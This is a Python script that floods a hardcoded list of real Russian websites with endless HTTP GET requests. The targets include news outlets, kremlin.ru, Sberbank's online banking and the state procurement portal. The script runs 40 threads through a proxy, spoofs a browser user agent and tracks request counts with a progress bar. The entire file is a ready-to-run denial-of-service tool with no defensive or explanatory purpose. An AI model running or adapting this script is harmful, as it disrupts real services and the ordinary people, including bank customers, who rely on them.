import queue
import requests
import threading
import progressbar

proxy = 'Your proxy'
count_threads = 40

sites = [
'https://lenta.ru/',
'https://ria.ru/',
'https://ria.ru/lenta/',
'https://www.rbc.ru/',
'https://www.rt.com/',
'http://kremlin.ru/',
'http://en.kremlin.ru/',
'https://smotrim.ru/',
'https://tass.ru/',
'https://tvzvezda.ru/',
'https://vsoloviev.ru/',
'https://www.1tv.ru/',
'https://www.vesti.ru/',
'https://online.sberbank.ru/',
'https://sberbank.ru/',
'https://zakupki.gov.ru/'
]

count = queue.Queue()
queue = queue.Queue()

for site in sites:
    queue.put(site)

proxies = {
   'http': 'http://{}'.format(proxy),
   'https': 'https://{}'.format(proxy),
   'ftp': 'ftp://{}'.format(proxy)
}

user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36'

def run():
    while True:
        site = queue.get()
        try:
            requests.get(site, proxies=proxies, headers={'User-Agent': user_agent})
        except:
            pass
        queue.put(site)
        count.put(1)

progress = progressbar.ProgressBar()

threads = []
for i in range(count_threads):
    t = threading.Thread(target=run)
    t.start()
    threads.append(t)


while True:
    progress.update(count.qsize())

progress.finish()

for t in threads:
    t.join()









